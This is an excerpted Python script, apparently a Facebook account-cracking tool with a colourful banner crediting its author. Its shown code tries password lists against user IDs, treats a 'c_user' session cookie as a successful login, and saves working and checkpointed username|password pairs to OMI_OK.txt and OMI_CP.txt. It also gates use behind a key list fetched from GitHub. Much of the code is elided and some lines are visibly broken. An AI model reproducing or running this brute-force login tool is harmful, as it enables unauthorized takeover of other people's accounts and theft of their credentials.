...
colouroff="\x1b[00m"
logo=""" 
\033[1;91m d88888b db    db  .o88b. db   dD 
\033[1;92m 88'     88    88 d8P  Y8 88 ,8P' 
\033[1;93m 88ooo   88    88 8P      88,8P 
\033[1;91m 88~~~   88    88 8b      88`8b
\033[1;92m 88      88b  d88 Y8b  d8 88 `88.
\033[1;93m YP      ~Y8888P'  `Y88P' YP   YD

\033[1;92m••••••••••••••••••••••••••••••••••••••••••••••••••••••••
     \033[1;92m➣ \033[1;92mDEVOLPER   :            OMI HASAN I
     \033[1;91m➣ \033[1;91mFACEBOOK   :            Omi Hasan I
     \033[1;92m➣ \033[1;92mWHATSAPP   :            01476115895
     \033[1;91m➣ \033[1;91mGITHUB     :            OMIdark
...
a=requests.get("https://github.com/OMIdark/apporved/main/250%20Tool").text
b=str(a)
key1=open("/storage/emulated/0/android8.txt",'r').read()
key2=str(key1)  
if key2 in b:
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;92m Total OK : \x1b[1;91m %s  \x1b[1;92mOMI_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;91m Total CP :\x1b[1;91m   %s \x1b[1;91mOMI_CP.txt' % (H, P, str(len(cp))))
	    input("\x1b[1;93mPress enter to back OMI Menu ")
	    sarfraz()
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;93m[OMI -CHECK] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [OMI-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('OMI_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s [OMI-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('OMI_CP.txt' , 'a').write('%s\n' % wrt)
                        break
...
def manual():
    try:
        ...
        login()
    try:
        r = requests.get('https://www.facebook.com/profile.php?id=100092013160584='+token).text
        q = json.loads(r)
        uname = q['name']
    except (KeyError):
        login()
